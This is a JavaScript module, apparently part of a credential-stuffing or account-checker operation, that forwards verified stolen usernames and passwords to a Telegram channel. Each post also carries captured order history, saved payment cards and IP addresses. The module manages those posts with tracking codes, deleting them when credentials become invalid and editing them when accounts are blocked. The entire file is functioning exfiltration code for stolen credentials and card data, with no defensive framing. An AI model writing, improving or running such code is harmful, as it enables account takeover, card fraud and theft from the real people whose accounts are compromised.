/**
 * Channel Forwarder - Distributed Worker Architecture
 * 
 * Handles forwarding VALID credentials to Telegram channel with tracking codes
 * and manages status updates (INVALID/BLOCKED) for previously forwarded messages.
 * 
 * Features:
 * - Subscribe to Redis pub/sub events (forward_events, update_events)
 * - Two-phase commit for reliable message forwarding
 * - Capture data validation before forwarding
 * - Status update handling (delete on INVALID, edit on BLOCKED)
 * - Pending forward retry on coordinator startup
 */

const crypto = require('crypto');
const { createLogger } = require('../../logger');
const { reserveForwarded, releaseForwarded } = require('../../telegram/channelForwardStore');
const { buildCheckAndCaptureResult } = require('../../telegram/messages');
const { codeV2 } = require('../../telegram/messages/helpers');

const log = createLogger('channel-forwarder');

class ChannelForwarder {
  constructor(redisClient, telegram, channelId) {
    this.redis = redisClient; // For regular commands
    this.pubSubRedis = null; // Will be initialized for pub/sub operations
    this.telegram = telegram;
    this.channelId = channelId;
    this.isSubscribed = false;
    
    // Bind methods to preserve 'this' context
    this.handleForwardEvent = this.handleForwardEvent.bind(this);
    this.handleUpdateEvent = this.handleUpdateEvent.bind(this);
  }

  /**
   * Start subscribing to Redis pub/sub events
   */
  async start() {
    if (this.isSubscribed) {
      log.debug('Already subscribed to Redis pub/sub events');
      return;
    }

    try {
      // Initialize separate pub/sub Redis connection
      const { getPubSubClient } = require('../../shared/redis/client');
      this.pubSubRedis = getPubSubClient();
      await this.pubSubRedis.connect();

      // Subscribe to forward and update events
      await this.pubSubRedis.executeCommand('subscribe', 'forward_events', 'update_events');
      
      // Set up message handlers
      const pubSubClient = this.pubSubRedis.getClient();
      pubSubClient.on('message', async (channel, message) => {
        try {
          const event = JSON.parse(message);
          
          if (channel === 'forward_events') {
            await this.handleForwardEvent(event);
          } else if (channel === 'update_events') {
            await this.handleUpdateEvent(event);
          }
        } catch (error) {
          log.error('Error processing pub/sub message', {
            channel,
            error: error.message,
            message: message.substring(0, 100)
          });
        }
      });

      this.isSubscribed = true;
      log.info('Channel forwarder started, subscribed to Redis pub/sub events');
      
      // Retry any pending forwards from previous coordinator crash
      await this.retryPendingForwards();
      
    } catch (error) {
      log.error('Failed to start channel forwarder', { error: error.message });
      throw error;
    }
  }

  /**
   * Stop subscribing to Redis pub/sub events
   */
  async stop() {
    if (!this.isSubscribed) return;

    try {
      if (this.pubSubRedis) {
        await this.pubSubRedis.executeCommand('unsubscribe', 'forward_events', 'update_events');
        await this.pubSubRedis.close();
        this.pubSubRedis = null;
      }
      this.isSubscribed = false;
      log.info('Channel forwarder stopped');
    } catch (error) {
      log.error('Error stopping channel forwarder', { error: error.message });
    }
  }

  /**
   * Validate capture data meets forwarding requirements
   * Requirements: latestOrder !== 'n/a' AND cards.length > 0
   */
  validateCaptureData(capture) {
    if (!capture) {
      return { valid: false, reason: 'no capture data' };
    }

    // Check for latest order (not 'n/a')
    if (!capture.latestOrder || capture.latestOrder === 'n/a') {
      return { valid: false, reason: 'no latest order' };
    }

    // Check for card data (profile must exist with cards array)
    if (!capture.profile) {
      return { valid: false, reason: 'no profile data' };
    }

    if (!capture.profile.cards || capture.profile.cards.length === 0) {
      return { valid: false, reason: 'no cards captured' };
    }

    return { valid: true, reason: '' };
  }

  /**
   * Handle forward_event from worker
   * Event: {username, password, capture, ipAddress, timestamp}
   * 
   * Implements two-phase commit for reliable message forwarding:
   * Phase 1: SET forward:pending:{trackingCode} with event data (2-min TTL)
   * Phase 2: Format and forward message to Telegram channel
   * Phase 3: Store message reference with 30-day TTL
   * Phase 4: Store reverse lookup: msg:cred:{username}:{password}
   * Phase 5: DEL forward:pending:{trackingCode}
   */
  async handleForwardEvent(event) {
    const { username, password, capture, ipAddress } = event;
    
    log.debug('Received forward event', {
      username: username.substring(0, 5) + '***',
      hasCapture: !!capture,
      ipAddress
    });

    // Validate capture data meets forwarding requirements
    const validation = this.validateCaptureData(capture);
    if (!validation.valid) {
      log.debug(`Skipping forward: ${validation.reason}`, {
        username: username.substring(0, 5) + '***'
      });
      return;
    }

    // Atomically reserve a forward slot to prevent duplicate channel posts
    const reserved = await reserveForwarded(username, password);
    if (!reserved) {
      log.debug('Skipping forward - already sent to channel', {
        username: username.substring(0, 5) + '***'
      });
      return;
    }

    // Generate tracking code: RK-${hash(username+password).substring(0, 8)}
    const trackingCode = this.generateTrackingCode(username, password);
    
    try {
      // Phase 1: SET forward:pending:{trackingCode} with event data (2-min TTL)
      await this.redis.executeCommand('setex', 
        `forward:pending:${trackingCode}`, 
        120, // 2 minutes
        JSON.stringify({
          ...event,
          trackingCode,
          phase: 'pending',
          createdAt: Date.now()
        })
      );

      log.debug('Two-phase commit Phase 1: Pending state created', { trackingCode });

      // Phase 2: Format and forward message to Telegram channel
      const message = this.formatChannelMessage(username, password, capture, ipAddress, trackingCode);
      const sentMessage = await this.telegram.sendMessage(this.channelId, message, {
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true
      });

      log.debug('Two-phase commit Phase 2: Message forwarded', { 
        trackingCode, 
        messageId: sentMessage.message_id 
      });

      // Phase 3: Store message reference with 30-day TTL
      const messageRef = {
        messageId: sentMessage.message_id,
        chatId: this.channelId,
        username,
        password,
        forwardedAt: Date.now(),
        trackingCode
      };
      
      await this.redis.executeCommand('setex',
        `msg:${trackingCode}`,
        30 * 24 * 60 * 60, // 30 days
        JSON.stringify(messageRef)
      );

      log.debug('Two-phase commit Phase 3: Message reference stored', { trackingCode });

      // Phase 4: Store reverse lookup: msg:cred:{username}:{password}
      await this.redis.executeCommand('setex',
        `msg:cred:${username}:${password}`,
        30 * 24 * 60 * 60, // 30 days
        trackingCode
      );

      log.debug('Two-phase commit Phase 4: Reverse lookup stored', { trackingCode });

      // Phase 5: DEL forward:pending:{trackingCode}
      await this.redis.executeCommand('del', `forward:pending:${trackingCode}`);

      log.info('Two-phase commit completed successfully', {
        username: username.substring(0, 5) + '***',
        trackingCode,
        messageId: sentMessage.message_id
      });

    } catch (error) {
      log.error('Two-phase commit failed', {
        username: username.substring(0, 5) + '***',
        trackingCode,
        error: error.message
      });
      
      // Clean up pending state on error
      try {
        await this.redis.executeCommand('del', `forward:pending:${trackingCode}`);
        log.debug('Cleaned up pending state after error', { trackingCode });
      } catch (cleanupError) {
        log.warn('Failed to clean up pending state', { 
          trackingCode, 
          cleanupError: cleanupError.message 
        });
      }

      try {
        await releaseForwarded(username, password);
      } catch (releaseError) {
        log.warn('Failed to release forward reservation after error', {
          username: username.substring(0, 5) + '***',
          error: releaseError.message
        });
      }
    }
  }

  /**
   * Handle update_event from worker for INVALID/BLOCKED status changes
   * Event: {username, password, newStatus, timestamp}
   * 
   * For INVALID: Delete channel message and Redis references
   * For BLOCKED: Edit channel message to show blocked status
   */
  async handleUpdateEvent(event) {
    const { username, password, newStatus } = event;
    
    log.debug('Received update event', {
      username: username.substring(0, 5) + '***',
      newStatus
    });

    // Only handle INVALID and BLOCKED status changes
    if (newStatus !== 'INVALID' && newStatus !== 'BLOCKED') {
      log.debug('Ignoring update event for non-INVALID/BLOCKED status', { newStatus });
      return;
    }

    try {
      // Query reverse lookup: GET msg:cred:{username}:{password}
      const trackingCode = event.trackingCode || await this.redis.executeCommand('get', `msg:cred:${username}:${password}`);
      
      if (!trackingCode) {
        log.debug('No tracking code found for credential', {
          username: username.substring(0, 5) + '***',
          newStatus
        });
        return;
      }

      // Get message reference
      const messageRefData = await this.redis.executeCommand('get', `msg:${trackingCode}`);
      
      if (!messageRefData) {
        log.warn('Tracking code found but no message reference', {
          username: username.substring(0, 5) + '***',
          trackingCode
        });
        return;
      }

      const messageRef = JSON.parse(messageRefData);
      const { messageId, chatId } = messageRef;

      if (newStatus === 'INVALID') {
        // For INVALID: Delete channel message and Redis references
        try {
          await this.telegram.deleteMessage(chatId, messageId);
          log.debug('Deleted channel message for INVALID credential', {
            trackingCode,
            messageId
          });
        } catch (deleteError) {
          if (deleteError.message.includes('message to delete not found') ||
              deleteError.message.includes('MESSAGE_ID_INVALID')) {
            log.debug('Message already deleted', { trackingCode, messageId });
          } else {
            log.warn('Failed to delete channel message', {
              trackingCode,
              messageId,
              error: deleteError.message
            });
          }
        }

        // Clean up Redis references
        await this.redis.executeCommand('del', `msg:${trackingCode}`);
        await this.redis.executeCommand('del', `msg:cred:${username}:${password}`);

        // Allow future forwards if the credential becomes valid again
        try {
          await releaseForwarded(username, password);
        } catch (releaseError) {
          log.warn('Failed to release dedupe after INVALID status', {
            username: username.substring(0, 5) + '***',
            error: releaseError.message
          });
        }

        log.info('Handled INVALID status update - message deleted', {
          username: username.substring(0, 5) + '***',
          trackingCode
        });

      } else if (newStatus === 'BLOCKED') {
        // For BLOCKED: Edit channel message to show blocked status
        const blockedMessage = this.formatBlockedMessage(trackingCode, username);
        
        try {
          await this.telegram.editMessageText(
            chatId,
            messageId,
            null,
            blockedMessage,
            { parse_mode: 'MarkdownV2' }
          );

          log.info('Handled BLOCKED status update - message updated', {
            username: username.substring(0, 5) + '***',
            trackingCode,
            messageId
          });

        } catch (editError) {
          if (editError.message.includes('message is not modified') ||
              editError.message.includes('MESSAGE_ID_INVALID')) {
            log.debug('Message already modified or deleted', { trackingCode, messageId });
          } else {
            log.warn('Failed to edit channel message for BLOCKED status', {
              trackingCode,
              messageId,
              error: editError.message
            });
          }
        }
      }

    } catch (error) {
      log.error('Failed to handle status update event', {
        username: username.substring(0, 5) + '***',
        newStatus,
        error: error.message
      });
    }
  }

  /**
   * Generate tracking code from credentials
   * Format: RK-${hash(username+password).substring(0, 8)}
   * Uses SHA-256 hash of username+password+timestamp+random for uniqueness
   */
  generateTrackingCode(username, password) {
    const data = `${username}:${password}:${Date.now()}:${Math.random()}`;
    const hash = crypto.createHash('sha256').update(data).digest('hex');
    return `RK-${hash.substring(0, 8).toUpperCase()}`;
  }

  /**
   * Format BLOCKED status message for channel
   */
  formatBlockedMessage(trackingCode, username) {
    const escapeV2 = (text) => {
      return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
    };
    
    const codeV2 = (text) => {
      return `\`${text.replace(/[`\\]/g, '\\$&')}\``;
    };
    
    const boldV2 = (text) => {
      return `*${text.replace(/[*\\]/g, '\\$&')}*`;
    };

    const parts = [
      `🔒 ${boldV2('ACCOUNT BLOCKED')}`,
      '',
      escapeV2('This account has been blocked or requires verification.'),
      '',
      `${boldV2('🔐 Credentials')}`,
      `└ User: ${codeV2(username)}`,
      '',
      `📎 ${codeV2(trackingCode)}`
    ];

    return parts.join('\n');
  }

  /**
   * Format message for Telegram channel
   */
  formatChannelMessage(username, password, capture, ipAddress, trackingCode) {
    const result = { status: 'VALID' };
    const baseMessage = buildCheckAndCaptureResult(result, capture, username, null, password, ipAddress);
    return `${baseMessage}\n\n📎 ${codeV2(trackingCode)}`;
  }

  /**
   * Retry pending forwards on coordinator startup
   * Scans forward:pending:* keys and retries forwards older than 30 seconds
   * Deletes pending state on success
   */
  async retryPendingForwards() {
    try {
      log.info('Scanning for pending forwards to retry');

      // Scan for all pending forward keys
      const pendingKeys = await this.redis.executeCommand('keys', 'forward:pending:*');
      
      if (pendingKeys.length === 0) {
        log.debug('No pending forwards found');
        return;
      }

      log.info(`Found ${pendingKeys.length} pending forwards to process`);
      
      const now = Date.now();
      let retriedCount = 0;
      let deletedCount = 0;

      for (const key of pendingKeys) {
        try {
          const pendingData = await this.redis.executeCommand('get', key);
          
          if (!pendingData) {
            log.debug(`Pending key ${key} has no data, skipping`);
            continue;
          }

          const event = JSON.parse(pendingData);
          const age = now - (event.createdAt || event.timestamp || 0);

          // Only retry forwards older than 30 seconds
          if (age > 30000) {
            log.info(`Retrying pending forward ${key} (age: ${Math.round(age / 1000)}s)`);
            
            // Retry the forward by calling handleForwardEvent
            // This will go through the full two-phase commit process
            await this.handleForwardEvent(event);
            
            retriedCount++;
          } else {
            log.debug(`Pending forward ${key} is too recent (age: ${Math.round(age / 1000)}s), skipping`);
          }

        } catch (error) {
          log.error(`Failed to retry pending forward ${key}`, { 
            error: error.message 
          });
          
          // If the forward is old enough and failed, clean it up to prevent infinite retries
          try {
            const pendingData = await this.redis.executeCommand('get', key);
            if (pendingData) {
              const event = JSON.parse(pendingData);
              const age = now - (event.createdAt || event.timestamp || 0);
              
              // Clean up forwards older than 10 minutes that keep failing
              if (age > 600000) {
                await this.redis.executeCommand('del', key);
                deletedCount++;
                log.warn(`Deleted stale pending forward ${key} (age: ${Math.round(age / 1000)}s)`);
              }
            }
          } catch (cleanupError) {
            log.warn(`Failed to clean up stale pending forward ${key}`, {
              cleanupError: cleanupError.message
            });
          }
        }
      }

      log.info('Pending forward retry completed', {
        totalPending: pendingKeys.length,
        retried: retriedCount,
        deleted: deletedCount
      });

    } catch (error) {
      log.error('Failed to retry pending forwards', { error: error.message });
    }
  }
}

module.exports = ChannelForwarder;